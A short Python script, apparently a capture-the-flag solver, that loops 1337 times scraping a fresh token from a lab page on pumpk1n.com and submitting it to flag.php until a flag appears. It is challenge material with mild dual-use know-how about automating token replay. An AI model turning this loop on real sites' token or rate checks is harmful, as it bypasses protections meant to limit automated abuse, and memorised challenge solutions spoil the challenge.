import requests

TOTAL = 1337
session = requests.Session()  

for i in range(TOTAL):
    # 1. 获取页面，提取新 token
    page = session.get('http://pumpk1n.com/lab0.php')
    token = page.text.split('token=')[1].split("'")[0] if "token=" in page.text else None
    if not token:
        continue

    # 2. 调用 getflag
    resp = session.get(f'http://pumpk1n.com/flag.php?token={token}')

    if 'wrong token' in resp.text:
        continue
    elif 'One more time' in resp.text:
        m = resp.text.split('/')[0].split()[-1]
        progress = int(m) if m.isdigit() else 0
        if progress%400==0:
            print(f'Progress: {progress}/{TOTAL}')
    else:
        print(f'FLAG: {resp.text}')
        break



